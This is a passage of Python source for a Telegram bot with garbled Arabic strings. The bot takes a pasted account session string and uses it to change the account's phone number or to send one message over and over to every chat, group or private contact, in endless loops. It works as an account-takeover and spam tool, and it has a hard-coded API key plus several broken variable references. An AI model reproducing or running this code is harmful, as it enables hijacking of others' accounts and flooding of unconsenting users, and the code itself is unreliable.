      await x.send_message("Ø§Ø¹Ø·Ù†ÙŠ Ø±Ù‚Ù… Ø§Ù„ØªÙŠ ØªØ±ÙŠØ¯ ØªØºÙŠØ± Ø§Ù„ÙŠÙ‡\n[Ù…Ù„Ø§Ø­Ø¸Ù‡ /Ù„Ø§ ØªØ³ØªØ®Ø¯Ù… Ø§Ø±Ù‚Ø§Ù… Ø§Ù„ÙˆÙ‡Ù…ÙŠÙ‡]\n[Ø§Ø°Ø§ Ø§Ø³ØªØ®Ø¯Ù…Øª Ø§Ù„Ø§Ø±Ù‚Ø§Ù… Ø§Ù„ÙˆÙ‡Ù…ÙŠÙ‡ Ù…Ø±Ø§Ø­ ØªÙƒØ¯Ø± ØªØ­ØµÙ„ Ø§Ù„ÙƒÙˆØ¯] ")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
        await asyncio.sleep(20)
        await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ Ù‡Ø§Ø´")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ Ø§Ù„ÙƒÙˆØ¯")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond("Ù„Ù‚Ø¯ ØªÙ… ØªØºÙŠØ± Ø±Ù‚Ù… Ø§Ù„Ø­Ø³Ø§Ø¨ Ø¨Ù†Ø¬Ø§Ø­")
        else:
          await event.respond("Ù‡Ù†Ø§Ùƒ Ø®Ø·Ø£ Ù…Ø§ Ø­ØµÙ„")
      except Exception as e:
        await event.respond("Ø§Ø±Ø³Ù„ Ø§Ù„Ù…Ø´ÙƒÙ„Ù‡ Ø§Ù„Ù‰ Ù„Ø­Ù„Ù‡Ø§- @N_B_1\n**LOGS**\n" + str(e))



@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"N")))
async def start(event):
    keyboard = [
      [  
        Button.inline("a", data="a"), 
        Button.inline("b", data="b"),
        Button.inline("c", data="c"),
        ],
      [
        Button.url("Ø§Ù„Ù…Ø§Ù„Ùƒ", "https://t.me/N_B_1")
        ]
    ]
    await event.reply("Now Give Me Flag Where U Want to Gcast \nâœ“ For All - Choose a\nâœ“ For Group - Choose b\nâœ“ For Private - Choose c", buttons=keyboard)



async def gcasta(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for aman in X.iter_dialogs():
                chat = aman.id
                try:
                    await X.send_message(chat, tol, file=file)     
                    if lol != -1001551357238:
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                    elif chat == -1001606996743:
                        pass
                    await asyncio.sleep()
                except Exception as e:
                    print(e)
        except Exception as e:
            print(e)        


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"a")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ Ø§Ù„Ø±Ø³Ø§Ù„Ù‡")
      msg = await x.get_response()
      await x.send_message("Ø§Ù„Ø§Ù† ØªÙ… Ø³ÙŠØªÙ… Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ù‡ Ø¨Ø´ÙƒÙ„ ØªÙ„Ù‚Ø§Ø¦ÙŠ ÙƒÙ„ 10 Ø¯Ù‚Ø§Ø¦Ù‚")
      i = await gcasta(strses.text, msg.text)
      await event.reply(f"Done Gcasted In {i} all ðŸ˜—ðŸ˜—.", buttons=keyboard)

molb = True

async def gcastb(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for sweetie in X.iter_dialogs():
                if sweetie.is_group:
                    chat = sweetie.id
                    try:
                        if chat != -1001606996743:
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(600)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(600)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            while molb != False:
                                await asyncio.sleep(600)
                                await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=60))
                        elif chat == -1001606996743:
                            pass
                    except Exception as e:
                        print(e)
        except Exception as e:
            print(e)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"b")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø¹Ø·ÙŠ Ø§Ù„Ø±Ø³Ø§Ù„Ù‡")
      msg = await x.get_response()
      await x.send_message("Ø§Ù„Ø§Ù† ØªÙ… Ø³ÙˆÙ ÙŠØªÙ… Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ù‡ ÙƒÙ„ 10 Ø¯Ù‚Ø§Ø¦Ù‚ Ø¨Ø´ÙƒÙ„ ØªÙ„Ù‚Ø§Ø¦ÙŠ")
      i = await gcastb(strses.text, msg.text)
      await event.reply(f"Done Gcasted In {i} Group ðŸ˜—ðŸ˜—.", buttons=keyboard)

async def gcastc(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for krishna in X.iter_dialogs():
                if krishna.is_user and not krishna.entity.bot:
                    chat = krishna.id
                    try:
                        await X.send_message(chat, tol, file=file)
                        while molc != False:
                            await asyncio.sleep(10)
                            await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=20))
                    except BaseException:
                        pass
        except Exception as e:
            print(e)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"c")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø¹Ø·Ù†ÙŠ Ø§Ù„Ø±Ø³Ø§Ù„Ù‡")
      msg = await x.get_response()
      await x.send_message("Ø§Ù„Ø§Ù† ØªÙ… Ø³ÙŠØªÙ… Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ù‡ Ø¨Ø´ÙƒÙ„ ØªÙ„Ù‚Ø§Ø¦ÙŠ ÙƒÙ„ 10 Ø¯Ù‚Ø§Ø¦Ù‚")
      i = await gcastc(strses.text, msg.text)
      await event.reply(f"Done Gcasted In {i} PrivateðŸ˜—ðŸ˜—.", buttons=keyboard)


tgbot.run_until_disconnected()
